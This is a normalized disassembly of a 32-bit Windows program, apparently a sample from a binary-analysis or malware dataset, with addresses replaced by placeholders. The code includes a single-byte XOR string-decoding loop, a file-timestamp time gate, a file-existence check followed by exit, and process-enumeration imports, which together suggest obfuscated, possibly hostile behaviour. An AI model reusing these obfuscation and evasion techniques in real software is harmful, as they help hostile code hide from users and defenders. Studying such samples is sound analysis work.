add esp 0x40
push 0x104
push rw-data
call sub_401bd0
push rw-data
call sub_4012f0
add esp 0xc
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push 0x0
call _sleep
push rw-data
call sub_4012f0
add esp 0x18
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_402200
push rw-data
call sub_4012f0
add esp 0x18
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_402200
push rw-data
call sub_4012f0
push 0x0
call _sleep
add esp 0x1c
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
push rw-data
call sub_402200
add esp 0x14
push rw-data
push rw-data
push rw-data
call sprintf
add esp 0xc
push rw-data
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
call sub_401460
push 0x1
call _sleep
add esp 0x4
push 0x0
call exit
lea eax [ esp + 0xc ]
push eax
call [ GetLocalTime@IAT ]
push 0x1
call _sleep
add esp 0x4
lea ecx [ esp + 0x50 ]
push ecx
push rw-data
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x54 ]
push edx
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call [ FileTimeToSystemTime@IAT ]
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0xc ]
and ecx 0xffff
and eax 0xffff
sub eax ecx
lea edx [ eax + eax * 8 ]
lea eax [ eax + edx * 8 ]
mov edx [ esp + 0x26 ]
and edx 0xffff
lea ecx [ eax + eax * 4 ]
mov eax [ esp + 0xe ]
and eax 0xffff
sub eax edx
mov edx [ esp + 0x12 ]
and edx 0xffff
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 ]
mov ecx [ esp + 0x2a ]
and ecx 0xffff
sub eax ecx
add eax edx
cmp eax 0xb4
jge r-xdata
push rw-data
call sub_402200
add esp 0x4
sub_402780
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402989
cmp [ rw-data ] ebx
jne r-xdata
call sub_402974
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402986
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4023c0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4021e0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test ecx ecx
jle r-xdata
retn
mov dl [ eax ]
xor dl 0x55
mov [ eax ] dl
inc eax
dec ecx
jne r-xdata
sprintf
jmp [ sprintf@IAT ]
strrchr
jmp [ strrchr@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
fclose
jmp [ fclose@IAT ]
fwrite
jmp [ fwrite@IAT ]
fopen
jmp [ fopen@IAT ]
strtok
jmp [ strtok@IAT ]
strncmp
jmp [ strncmp@IAT ]
_sleep
jmp [ _sleep@IAT ]
free
jmp [ free@IAT ]
strstr
jmp [ strstr@IAT ]
atoi
jmp [ atoi@IAT ]
realloc
jmp [ realloc@IAT ]
malloc
jmp [ malloc@IAT ]
strncpy
jmp [ strncpy@IAT ]
fflush
jmp [ fflush@IAT ]
_filelength
jmp [ _filelength@IAT ]
exit
jmp [ exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402974
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402986
xor eax eax
retn
sub_402989
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
_strdup
jmp [ _strdup@IAT ]
